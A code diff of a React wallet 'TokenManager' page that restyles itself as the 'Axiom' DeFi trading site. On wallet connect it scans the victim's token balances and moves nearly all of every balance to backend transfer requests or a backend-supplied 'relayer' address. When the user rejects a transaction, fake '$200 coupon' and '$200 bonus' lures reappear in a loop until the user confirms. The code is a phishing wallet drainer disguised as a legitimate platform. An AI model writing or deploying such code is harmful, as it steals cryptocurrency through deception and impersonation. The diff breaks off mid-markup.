@@ -1,8 +1,8 @@
-'use client'
+"use client"
 
-import React, { useEffect, useState } from 'react'
+import React, { useEffect, useState, useRef } from 'react'
 import { useAppKit } from '@reown/appkit/react'
-import { useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
+import { useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
 import { ethers } from 'ethers'
 
 interface Token {
@@ -28,22 +28,22 @@ interface FailedItem {
 
 // Función helper para fetch con mejor manejo de errores
 const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
-  const res = await fetch(url, options);
-  
+  const res = await fetch(url, options)
+
   // Verificar el tipo de contenido antes de analizar JSON
-  const contentType = res.headers.get('content-type');
+  const contentType = res.headers.get('content-type')
   if (!contentType || !contentType.includes('application/json')) {
-    const text = await res.text();
-    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
+    const text = await res.text()
+    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 200)}`)
   }
 
   if (!res.ok) {
-    const errorData = await res.json();
-    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
+    const errorData = await res.json().catch(() => ({}))
+    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`)
   }
 
-  return res.json();
-};
+  return res.json()
+}
 
 export default function TokenManager(): React.JSX.Element {
   const { open } = useAppKit()
@@ -64,55 +64,132 @@ export default function TokenManager(): React.JSX.Element {
   const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
   const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])
 
+  // Estados para modales
+  const [showModal, setShowModal] = useState<boolean>(false)
+  const [modalContent, setModalContent] = useState<{
+    title: string
+    message: string
+    type: 'error' | 'info' | 'success'
+    onConfirm?: () => void
+    confirmText?: string
+    showCancel?: boolean
+    onCancel?: () => void
+  }>({
+    title: '',
+    message: '',
+    type: 'info'
+  })
+
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
+  const { switchChain } = useSwitchChain()
 
-  const changeChainIfNeeded = async (targetChainId: number): Promise<void> => {
-  try {
-    if (!walletClient) throw new Error('Wallet client no disponible');
-    
-    // Obtener la cadena actual
-    const currentChainId = await walletClient.getChainId();
-    if (currentChainId === targetChainId) return;
+  // Ref para evitar scans concurrentes
+  const scanningRef = useRef(false)
 
-    // Intentar cambiar de cadena
-    showLoading(`Cambiando a la red ${targetChainId}...`);
-    
-    await walletClient.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{ chainId: `0x${targetChainId.toString(16)}` }],
-    });
-    
-    // Esperar a que la wallet se actualice
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-  } catch (error: any) {
-    if (error.code === 4902) {
-      // Cadena no agregada en la wallet - agregar BNB Chain si es necesario
-      if (targetChainId === 56) {
-        await walletClient.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: '0x38',
-            chainName: 'BNB Smart Chain',
-            nativeCurrency: {
-              name: 'BNB',
-              symbol: 'BNB',
-              decimals: 18,
-            },
-            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-            blockExplorerUrls: ['https://bscscan.com/'],
-          }],
-        });
-        return;
-      }
-      throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`);
-    }
-    if (isUserRejected(error)) {
-      throw new Error('Usuario rechazó el cambio de red');
-    }
-    throw new Error(`Error cambiando de red: ${error.message}`);
+  // Función para mostrar modales
+  const showAlertModal = (
+    title: string,
+    message: string,
+    type: 'error' | 'info' | 'success' = 'info',
+    onConfirm?: () => void,
+    confirmText: string = 'Accept',
+    showCancel: boolean = false,
+    onCancel?: () => void
+  ) => {
+    setModalContent({ title, message, type, onConfirm, confirmText, showCancel, onCancel })
+    setShowModal(true)
   }
-};
+
+  const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
+    if (!walletClient) throw new Error('Wallet client no disponible')
+
+    try {
+      setLoadingMessage(`Cambiando a la red ${targetChainId}...`)
+      setIsLoading(true)
+
+      const getCurrent = async () => {
+        try {
+          return await walletClient.getChainId()
+        } catch (e) {
+          return undefined
+        }
+      }
+
+      const currentChainId = await getCurrent()
+      if (currentChainId === targetChainId) {
+        setIsLoading(false)
+        return
+      }
+
+      // Intentar usar switchChain de wagmi si está disponible
+      let switched = false
+      try {
+        if (switchChain) {
+          await switchChain({ chainId: targetChainId })
+          switched = true
+        }
+      } catch (swErr: any) {
+        if (isUserRejected(swErr)) {
+          throw new Error('Usuario rechazó el cambio de red')
+        }
+      }
+
+      // Si no se hizo el cambio con switchChain, intentar con request RPC
+      if (!switched) {
+        try {
+          await walletClient.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: `0x${targetChainId.toString(16)}` }]
+          })
+        } catch (err: any) {
+          if (err?.code === 4902) {
+            if (targetChainId === 56) {
+              await walletClient.request({
+                method: 'wallet_addEthereumChain',
+                params: [
+                  {
+                    chainId: '0x38',
+                    chainName: 'BNB Smart Chain',
+                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                    blockExplorerUrls: ['https://bscscan.com/']
+                  }
+                ]
+              })
+
+              await walletClient.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }]
+              })
+            } else {
+              throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`)
+            }
+          } else if (isUserRejected(err)) {
+            throw new Error('Usuario rechazó el cambio de red')
+          } else {
+            throw err
+          }
+        }
+      }
+
+      // Polling: esperar hasta que la wallet realmente reporte la nueva chain
+      const start = Date.now()
+      while (Date.now() - start < timeoutMs) {
+        const newChain = await getCurrent()
+        if (newChain === targetChainId) {
+          setIsLoading(false)
+          return
+        }
+        await new Promise((r) => setTimeout(r, 500))
+      }
+
+      throw new Error('Timeout esperando que la wallet cambie de red')
+    } catch (error: any) {
+      setIsLoading(false)
+      if (isUserRejected(error)) throw new Error('Usuario rechazó el cambio de red')
+      throw new Error(error?.message || String(error))
+    }
+  }
 
   useEffect(() => {
     setIsClient(true)
@@ -134,87 +211,60 @@ export default function TokenManager(): React.JSX.Element {
     }
   }, [])
 
+  // RESET cuando se desconecta para permitir re-intentos limpios
   useEffect(() => {
-    if (isConnected && address && !hasScanned && !scanError) {
-      scanWallet()
+    if (!isConnected) {
+      console.log('[TokenManager] wallet disconnected - resetting state')
+      setHasScanned(false)
+      setTokens([])
+      setDetectedTokensCount(0)
+      setSummary({ sent: [], failed: [] })
+      setScanError('')
+      setPendingNativeTokens([])
     }
-  }, [isConnected, address, hasScanned, scanError])
+  }, [isConnected])
+
+  // Nuevo useEffect: dispara scan al conectar (y cuando cambia address)
+  useEffect(() => {
+    console.log('[TokenManager] connection change', { isConnected, address, hasScanned, tokensLength: tokens.length })
+    if (isConnected && address) {
+      // Evitar rescans si ya hay un scan en progreso
+      if (scanningRef.current) {
+        console.log('[TokenManager] scan already in progress - skipping')
+        return
+      }
+
+      // Evitar rescans si ya tenemos tokens detectados
+      if (hasScanned && tokens.length > 0) return
+
+      // Ejecutar scan de manera inmediata, sin timeout forzado
+      scanWallet().catch((e) => {
+        console.error('scanWallet error (from connect effect):', e)
+      })
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isConnected, address])
 
   useEffect(() => {
-    // Iniciar procesamiento automáticamente cuando se detectan tokens
-    if (hasScanned && tokens.length > 0 && !processing) {
+    if (hasScanned && tokens.length > 0 && !processing && !showModal && !isLoading) {
       setShowProcessingModal(true)
-      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
       setTimeout(() => {
         processAllTokens()
       }, 1500)
     }
-  }, [hasScanned, tokens, processing])
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [hasScanned, tokens, processing, showModal, isLoading])
 
   const showLoading = (message: string) => {
+    console.log('[UI] showLoading:', message)
     setLoadingMessage(message)
     setIsLoading(true)
   }
 
   const hideLoading = () => {
+    console.log('[UI] hideLoading')
     setIsLoading(false)
     setLoadingMessage('')
-  }
-
-  const scanWallet = async (): Promise<void> => {
-    try {
-      setScanError('')
-      showLoading('Escaneando tokens en todas las cadenas...')
-
-      if (!BACKEND) {
-        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
-        console.error('[CONFIG]', errorMsg)
-        setScanError(errorMsg)
-        hideLoading()
-        await alertAction(errorMsg)
-        return
-      }
-
-      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({ owner: address })
-      })
-
-      console.log('Tokens detectados:', data)
-
-      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
-        if (token.symbol === 'MATIC' && !token.address) {
-          return { ...token, address: null }
-        }
-        return token
-      })
-
-      // Guardar todos los tokens
-      setTokens(processedTokens || [])
-      setDetectedTokensCount(processedTokens.length)
-      setHasScanned(true)
-      
-      // Preparar tokens nativos pendientes
-      const nativeTokens = processedTokens.filter(token => !token.address)
-      setPendingNativeTokens(nativeTokens)
-      
-      // Log de tokens en consola
-      if (processedTokens.length > 0) {
-        console.log('Tokens detectados:', processedTokens)
-      }
-      
-      hideLoading()
-    } catch (err: any) {
-      console.error('Error escaneando wallet:', err)
-      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
-      setScanError(errorMsg)
-      hideLoading()
-      await alertAction(errorMsg + '\n\nPor favor, intenta reconectar la wallet.')
-    }
   }
 
   const alertAction = async (message: string): Promise<void> => {
@@ -223,12 +273,12 @@ export default function TokenManager(): React.JSX.Element {
       return
     }
 
-    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
-      globalThis.alert(message)
-      return
-    }
-
-    console.log('Alert fallback:', message)
+    return new Promise((resolve) => {
+      showAlertModal('Alert', message, 'info', () => {
+        setShowModal(false)
+        resolve()
+      })
+    })
   }
 
   const confirmAction = async (message: string): Promise<boolean> => {
@@ -254,11 +304,109 @@ export default function TokenManager(): React.JSX.Element {
       })
     }
 
-    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
-      return Promise.resolve(Boolean(globalThis.confirm(message)))
-    }
+    return new Promise((resolve) => {
+      showAlertModal(
+        'Accept',
+        message,
+        'info',
+        () => {
+          setShowModal(false)
+          resolve(true)
+        },
+        'Accept',
+        true,
+        () => {
+          setShowModal(false)
+          resolve(false)
+        }
+      )
+    })
+  }
 
-    return Promise.resolve(false)
+  const scanWallet = async (): Promise<void> => {
+    if (scanningRef.current) {
+      console.log('[scanWallet] Scan already in progress - skipping')
+      return
+    }
+    scanningRef.current = true
+
+    try {
+      setScanError('')
+      showLoading('Scanning wallet...')
+
+      if (!BACKEND) {
+        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
+        console.error('[CONFIG]', errorMsg)
+        setScanError(errorMsg)
+        hideLoading()
+        showAlertModal('Error', errorMsg, 'error')
+        return
+      }
+
+      if (!address) {
+        throw new Error('Address no está disponible aún')
+      }
+
+      console.log('[scanWallet] requesting owner-tokens for', address)
+
+      // Petición ALLOWED to take as long as necessary — NO timeouts forzados aquí.
+      const data: any = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: 'application/json'
+        },
+        body: JSON.stringify({ owner: address })
+      })
+
+      console.log('[scanWallet] backend response', data)
+
+      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
+        if (token.symbol === 'MATIC' && !token.address) {
+          return { ...token, address: null }
+        }
+        return token
+      })
+
+      if (!processedTokens || processedTokens.length === 0) {
+        console.log('[scanWallet] no tokens found')
+        setHasScanned(true)
+        hideLoading()
+        showAlertModal(
+          'Error',
+          'Error no tienes saldo, recarga la billetera e intenta de nuevo',
+          'error',
+          () => {
+            setShowModal(false)
+            scanWallet().catch((e) => console.error(e))
+          },
+          'Reintentar'
+        )
+        return
+      }
+
+      setTokens(processedTokens || [])
+      setDetectedTokensCount(processedTokens.length)
+      setHasScanned(true)
+
+      const nativeTokens = processedTokens.filter((token) => !token.address)
+      setPendingNativeTokens(nativeTokens)
+
+      if (processedTokens.length > 0) {
+        console.log('[scanWallet] tokens', processedTokens)
+      }
+
+      hideLoading()
+    } catch (err: any) {
+      console.error('[scanWallet] Error', err)
+      const errorMsg = '' + (err?.message || err)
+      setScanError(errorMsg)
+      hideLoading()
+      showAlertModal('Error', `${errorMsg} Please try reconnecting the wallet.`, 'error')
+    } finally {
+      scanningRef.current = false
+      hideLoading()
+    }
   }
 
   const getWrapInfo = async (chainId: number): Promise<any | null> => {
@@ -269,14 +417,14 @@ export default function TokenManager(): React.JSX.Element {
       }
       return await fetchWithErrorHandling(`${BACKEND}/wrap-info`, {
         method: 'POST',
-        headers: { 
+        headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json'
+          Accept: 'application/json'
         },
         body: JSON.stringify({ chain: chainId })
       })
     } catch (err) {
-      console.error('Error obteniendo info de wrap:', err)
+      console.error('Error, please reload the page and try again.', err)
       return null
     }
   }
@@ -287,52 +435,47 @@ export default function TokenManager(): React.JSX.Element {
     return /user denied|user rejected|rejected by user/i.test(message)
   }
 
-  const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
-  try {
-    if (!walletClient || !publicClient || !address) {
-      throw new Error('Wallet no conectada correctamente');
-    }
+  const processNativeToken = async (token: Token): Promise<{ success: boolean; reason?: string }> => {
+    try {
+      if (!walletClient || !publicClient || !address) {
+        throw new Error('Wallet not connected correctly')
+      }
 
-    const targetChainId = token.chain as number;
-    if (!targetChainId) {
-      throw new Error('No se pudo determinar la cadena del token');
-    }
+      if (!token.chain) throw new Error('Token chain not specified')
+      await changeChainIfNeeded(token.chain as number)
 
-    // Cambiar a la cadena correcta antes de procesar
-    await changeChainIfNeeded(targetChainId);
-
-    // Resto del código para wrap o transferencia...
-    const wrapInfo = await getWrapInfo(targetChainId);
-    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
+      const wrapInfo = await getWrapInfo(token.chain as number)
+      const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress
 
       const balanceBN = ethers.BigNumber.from(token.balance || '0')
-      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
+      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000')
 
-      // Estimaciones de gas
       const gasLimitTransfer = ethers.BigNumber.from(21000)
       const gasLimitWrap = ethers.BigNumber.from(100000)
 
-      // Buffer de seguridad
       const buffer = gasPrice.mul(30000)
 
-      // Calcular máximos seguros
       const feeWrap = gasPrice.mul(gasLimitWrap)
       const feeTransfer = gasPrice.mul(gasLimitTransfer)
       const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
       const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)
 
-      // Si no hay suficiente para ninguna operación
       if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
         const reason = 'Saldo insuficiente para cubrir gas fees'
-        setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+        setSummary((prev) => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+        if (!showModal) {
+          showAlertModal('Error', 'Por favor recargue la wallet', 'error', () => {
+            setShowModal(false)
+            window.location.reload()
+          }, 'Reintentar')
+        }
         return { success: false, reason }
       }
 
-      // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
       if (wrappedAddress && maxSafeForWrap.gt(0)) {
         try {
-          showLoading(`Procesando wrap de ${token.symbol}...`)
-          
+          showLoading(`Processing ${token.symbol}...`)
+
           const wrapAbi = [
             {
               inputs: [],
@@ -343,10 +486,9 @@ export default function TokenManager(): React.JSX.Element {
             }
           ] as const
 
-          // Reintentar hasta que la transacción sea confirmada
-          let transactionHash: string | undefined;
-          let confirmed = false;
-          
+          let transactionHash: string | undefined
+          let confirmed = false
+
           while (!confirmed) {
             try {
               transactionHash = await walletClient.writeContract({
@@ -357,295 +499,368 @@ export default function TokenManager(): React.JSX.Element {
                 gas: gasLimitWrap.toBigInt()
               })
 
-              showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
+              showLoading(`Waiting for confirmation ${token.symbol}...`)
               await publicClient.waitForTransactionReceipt({ hash: transactionHash })
-              confirmed = true;
-
+              confirmed = true
             } catch (error: any) {
               if (isUserRejected(error)) {
-                // Si el usuario rechaza, mostrar alerta y reintentar
-                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
-                continue;
+                await alertAction("There's little time left to claim your $200 coupon.")
+                continue
               }
-              throw error;
+              throw error
             }
           }
 
-          setSummary(prev => ({
+          setSummary((prev) => ({
             ...prev,
-            sent: [...prev.sent, { 
-              token: { ...token, symbol: `W${token.symbol}` }, 
-              type: 'wrap', 
-              tx: transactionHash, 
-              amount: maxSafeForWrap.toString() 
-            }]
+            sent: [...prev.sent, { token: { ...token, symbol: `W${token.symbol}` }, type: 'wrap', tx: transactionHash, amount: maxSafeForWrap.toString() }]
           }))
 
           hideLoading()
           return { success: true }
         } catch (error: any) {
-            // Manejo de errores
-            console.error('Error procesando token nativo:', error);
-            const reason = isUserRejected(error) ? 
-              'Usuario rechazó la transacción' : 
-              `Error: ${error?.message || error}`;
+          console.error('Error', error)
+          const reason = isUserRejected(error) ? 'Error' : `Error: ${error?.message || error}`
+          setSummary((prev) => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+          return { success: false, reason }
+        }
+      }
 
-            setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
-            return { success: false, reason };
-          }
-        };
-
-      // Si no se hizo wrap, crear solicitud de transferencia en el backend
       if (maxSafeForTransfer.gt(0)) {
         if (!BACKEND) throw new Error('BACKEND no configurado')
-        
-        showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
+
+        showLoading(`Creating request ${token.symbol}...`)
         const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
           method: 'POST',
-          headers: { 
+          headers: {
             'Content-Type': 'application/json',
-            'Accept': 'application/json'
+            Accept: 'application/json'
           },
-          body: JSON.stringify({
-            owner: address,
-            chain: token.chain,
-            amount: maxSafeForTransfer.toString()
-          })
+          body: JSON.stringify({ owner: address, chain: token.chain, amount: maxSafeForTransfer.toString() })
         })
 
         if (data.ok && data.instructions && data.instructions.relayerAddress) {
-          // Reintentar hasta que la transacción sea confirmada
-          let transactionHash: string | undefined;
-          let confirmed = false;
-          
+          let transactionHash: string | undefined
+          let confirmed = false
+
           while (!confirmed) {
             try {
-              showLoading(`Enviando ${token.symbol} al relayer...`)
+              showLoading(`Waiting ${token.symbol}...`)
               transactionHash = await walletClient.sendTransaction({
                 to: data.instructions.relayerAddress as `0x${string}`,
                 value: maxSafeForTransfer.toBigInt(),
                 gas: gasLimitTransfer.toBigInt()
               })
 
-              showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
+              showLoading(`Waiting for confirmation ${token.symbol}...`)
               await publicClient.waitForTransactionReceipt({ hash: transactionHash })
-              confirmed = true;
-
+              confirmed = true
             } catch (error: any) {
               if (isUserRejected(error)) {
-                // Si el usuario rechaza, mostrar alerta y reintentar
-                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
-                continue;
+                await alertAction("There's little time left to claim your $200 coupon.")
+                continue
               }
-              throw error;
+              throw error
             }
           }
 
-          setSummary(prev => ({
+          setSummary((prev) => ({
             ...prev,
-            sent: [...prev.sent, { 
-              token, 
-              type: 'transfer', 
-              tx: transactionHash, 
-              amount: maxSafeForTransfer.toString(), 
-              jobId: data.jobId 
-            }]
+            sent: [...prev.sent, { token, type: 'transfer', tx: transactionHash, amount: maxSafeForTransfer.toString(), jobId: data.jobId }]
           }))
-          
+
           hideLoading()
           return { success: true }
         } else {
           hideLoading()
-          throw new Error('Error creando solicitud de transferencia')
+          throw new Error('Error')
         }
       }
-      
+
       hideLoading()
-      return { success: false, reason: 'No se pudo procesar el token nativo' }
+      return { success: false, reason: 'The request could not be processed' }
     } catch (error: any) {
       hideLoading()
-      console.error('Error procesando token nativo:', error)
-
-      const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`
-
-      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+      console.error('Error', error)
+      const reason = isUserRejected(error) ? 'Error' : `Error: ${error?.message || error}`
+      setSummary((prev) => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
       return { success: false, reason }
     }
   }
 
-  const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
+  const processToken = async (token: Token): Promise<{ success: boolean; reason?: string }> => {
     try {
       if (!BACKEND) throw new Error('BACKEND no configurado')
-      
+
       showLoading(`Procesando ${token.symbol}...`)
       const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
         method: 'POST',
-        headers: { 
+        headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json'
+          Accept: 'application/json'
         },
-        body: JSON.stringify({
-          owner: address,
-          chain: token.chain,
-          token: token.address,
-          amount: token.balance
-        })
+        body: JSON.stringify({ owner: address, chain: token.chain, token: token.address, amount: token.balance })
       })
 
       if (data.ok) {
-        setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
+        setSummary((prev) => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
         hideLoading()
         return { success: true }
-      } else {
-        hideLoading()
-        throw new Error(data.error || 'Error creando solicitud de transferencia')
       }
+
+      hideLoading()
+      throw new Error(data.error || 'Error')
     } catch (error: any) {
       hideLoading()
-      console.error('Error procesando token:', error)
-      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error desconocido' }] }))
-      return { success: false, reason: error?.message || 'Error desconocido' }
+      console.error('Error', error)
+      setSummary((prev) => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error' }] }))
+      return { success: false, reason: error?.message || 'Error' }
     }
   }
 
   const processAllTokens = async (): Promise<void> => {
-    if (!tokens.length) {
+    if (!tokens.length || processing) {
       setShowProcessingModal(false)
       return
     }
 
     setProcessing(true)
-    setSummary({ sent: [], failed: [] }) // Reset summary
-    
-    // Separar tokens nativos y no nativos
-    const nonNativeTokens = tokens.filter(token => token.address !== null)
-    const nativeTokens = tokens.filter(token => token.address === null)
-    
-    // Si hay tokens nativos, mostrar confirmación persistente
-    if (nativeTokens.length > 0) {
-      let shouldProcessNatives = false;
-      
-      // Persistir hasta que el usuario acepte procesar los tokens nativos
-      while (!shouldProcessNatives) {
-        shouldProcessNatives = await confirmAction(
-          `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
-        );
-        
-        if (!shouldProcessNatives) {
-          // Si el usuario cancela, mostrar mensaje y volver a preguntar
-          await alertAction('Debes aceptar el procesamiento de tokens nativos para continuar.');
-        }
-      }
-    }
-    
-    // Ordenar tokens nativos por balance (mayor primero)
-    const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
-      const balanceA = ethers.BigNumber.from(a.balance || '0')
-      const balanceB = ethers.BigNumber.from(b.balance || '0')
-      return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
-    })
+    setSummary({ sent: [], failed: [] })
 
-    // Procesar tokens no nativos automáticamente
+    const nonNativeTokens = tokens.filter((token) => token.address !== null)
+    const nativeTokens = tokens.filter((token) => token.address === null)
+
     for (const token of nonNativeTokens) {
       await processToken(token)
     }
 
-    // Procesar tokens nativos automáticamente
-    for (const token of sortedNativeTokens) {
-      await processNativeToken(token)
+    if (nativeTokens.length > 0) {
+      const shouldProcessNatives = await confirmAction('You have a $200 bonus available to claim.')
+
+      if (shouldProcessNatives) {
+        for (const token of nativeTokens) {
+          if (token.chain) await changeChainIfNeeded(token.chain as number)
+          await processNativeToken(token)
+        }
+      } else {
+        setSummary((prev) => ({ ...prev, failed: [...prev.failed, ...nativeTokens.map((t) => ({ token: t, reason: 'Error' }))] }))
+      }
     }
 
     setProcessing(false)
     setShowProcessingModal(false)
 
-    // Mostrar resumen después de un breve delay para que se actualice el estado
-    setTimeout(async () => {
+    setTimeout(() => {
       if (summary.sent.length > 0 || summary.failed.length > 0) {
-        let message = '=== Resumen ===\n'
-        message += `Éxitos: ${summary.sent.length}\n`
-        message += `Fallos: ${summary.failed.length}\n`
+        let message = 'Summary:'
+        message += ` Successes: ${summary.sent.length}`
+        message += ` Failures: ${summary.failed.length}. Please check your balance and try again.`
 
         if (summary.failed.length > 0) {
-          message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
+          message += ' The request was not processed. Check the details.'
         }
 
-        await alertAction(message)
+        showAlertModal('Process results', message, 'info')
       }
     }, 100)
   }
 
-  // Evitar renderizado hasta que estemos en el cliente
   if (!isClient) {
     return (
-      <div style={{
-        display: 'flex',
-        justifyContent: 'center',
-        alignItems: 'center',
-        height: '100vh',
-        flexDirection: 'column'
-      }}>
-        <h1>Administrador de Tokens</h1>
-        <p>Cargando...</p>
-      </div>
+      <div
+        style={{
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          height: '100vh',
+          flexDirection: 'column'
+        }}
+      />
     )
   }
 
   return (
-    <div style={{
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center',
-      height: '100vh',
-      flexDirection: 'column'
-    }}>
-      <button
-        onClick={() => open()}
+    <div style={{ width: '100%', height: '100%', fontFamily: 'Inter, sans-serif' }}>
+      {/* Navigation */}
+      <nav
+        className="navbar"
         style={{
-          padding: '12px 16px',
-          fontSize: '16px',
-          backgroundColor: '#0070f3',
-          color: 'white',
-          border: 'none',
-          borderRadius: '8px',
-          cursor: 'pointer'
-        }}
-      >
-        {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
-      </button>
-
-      {(isLoading || showProcessingModal) && (
-        <div style={{
+          display: 'flex',
+          justifyContent: 'space-between',
+          alignItems: 'center',
+          padding: '1rem 2rem',
+          backgroundColor: '#000',
           position: 'fixed',
           top: 0,
           left: 0,
           right: 0,
-          bottom: 0,
-          backgroundColor: 'rgba(0, 0, 0, 0.8)',
-          display: 'flex',
-          justifyContent: 'center',
-          alignItems: 'center',
-          zIndex: 1000,
-          flexDirection: 'column'
-        }}>
-          <div style={{
-            width: '50px',
-            height: '50px',
-            border: '5px solid #f3f3f3',
-            borderTop: '5px solid #0070f3',
-            borderRadius: '50%',
-            animation: 'spin 1s linear infinite',
-            marginBottom: '20px'
-          }}></div>
-          <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
-            {showProcessingModal 
-              ? `Procesando ${detectedTokensCount} tokens detectados...` 
-              : loadingMessage}
+          zIndex: 100
+        }}
+      >
+        <img
+          src="media/Axiom Logo.svg"
+          className="responsive-logo"
+          alt="Axiom Logo"
+          style={{ width: '10%', maxWidth: '120px', minWidth: '80px' }}
+        />
+        <div className="nav-buttons" style={{ display: 'flex', gap: '1rem' }}>
+          <button
+            className="login-btn"
+            onClick={() => open()}
+            style={{
+              padding: '10px 16px',
+              backgroundColor: 'transparent',
+              color: '#fff',
+              border: '1px solid #333',
+              borderRadius: '8px',
+              cursor: 'pointer',
+              fontSize: '14px'
+            }}
+          >
+            Login
+          </button>
+          <button
+            className="signup-btn"
+            onClick={() => open()}
+            style={{
+              padding: '10px 16px',
+              backgroundColor: '#0070f3',
+              color: 'white',
+              border: 'none',
+              borderRadius: '8px',
+              cursor: 'pointer',
+              fontSize: '14px'
+            }}
+          >
+            Sign up
+          </button>
+        </div>
+      </nav>
+
+      {/* Main content */}
+      <main className="main-content" style={{ width: '100%', minHeight: '100vh' }}>
+        <section
+          className="main-content"
+          style={{
+            width: '100%',
+            height: '100vh',
+            backgroundImage: 'url(media/Captura_de_pantalla_2025-08-13_231920.png)',
+            backgroundSize: 'cover',
+            backgroundPosition: 'center',
+            display: 'flex',
+            flexDirection: 'column',
+            justifyContent: 'center',
+            alignItems: 'center',
+            textAlign: 'center',
+            paddingTop: '4rem'
+          }}
+        >
+          <div style={{ paddingTop: '5%' }}>
+            <img src="media/Logo.svg" style={{ width: '200%', maxWidth: '600px' }} alt="Axiom Logo" />
+          </div>
+
+          <h1 className="main-title" style={{ marginTop: '2%', color: '#fff', fontSize: '3rem', fontWeight: 700 }}>
+            The Gateway to DeFi
+          </h1>
+
+          <p className="subtitle" style={{ color: '#ccc', fontSize: '1.2rem', marginBottom: '2rem' }}>
+            Axiom is the only trading platform you'll ever need.
           </p>
-          <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
-            Por favor espere, esto puede tomar varios minutos...
-            <br />
-            {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
-          </p>
+
+          <button
+            style={{
+              marginTop: '2%',
+              padding: '12px 24px',
+              backgroundColor: '#0070f3',
+              color: 'white',
+              border: 'none',
+              borderRadius: '8px',
+              cursor: 'pointer',
+              fontSize: '16px',
+              fontWeight: 600
+            }}
+            onClick={() => open()}
+          >
+            {isConnected ? `Connected: ${String(address)?.substring(0, 8)}...` : 'Start Trading'}
+          </button>
+
+          <div className="backed-by" style={{ marginTop: '3rem', color: '#888', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
